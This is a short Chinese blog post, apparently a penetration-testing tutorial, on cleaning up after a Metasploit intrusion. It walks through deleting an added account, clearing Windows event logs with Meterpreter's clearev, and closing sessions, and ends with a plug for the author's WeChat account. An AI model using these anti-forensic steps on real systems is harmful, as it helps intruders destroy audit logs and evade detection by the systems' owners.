---
layout: post
category: binghe-code-hack
title: MSF-Meterpreter清理日志
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: MSF-Meterpreter清理日志
lock: need
---

# MSF-Meterpreter清理日志

在我们用MSF成功对目标进行了渗透之后，不要忘记要清理渗透过程中留下的日志，下面就如何清理日志和大家分享下。

步骤如下：

- 删除之前添加的账号
- 删除所有在渗透过程中使用的工具
- 删除应用程序、系统和安全日志
- 关闭所有的Meterpreter连接

## 删除之前添加的账号

```
C:\Windows\system32> net user 添加的用户名 /del
```

## 退出目标服务器的shell

```
C:\Windows\system32> exit
或者
C:\Windows\system32> logoff
```

## 删除日志

```
meterpreter > clearev
```

## 退出meterpreter shell

```
meterpreter > exit
```

## 查看所有的MSF连接

```
msf exploit(multi/handler) > sessions
```

## 关闭所有的MSF链接

```
msf exploit(multi/handler) > sessions -K
```


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)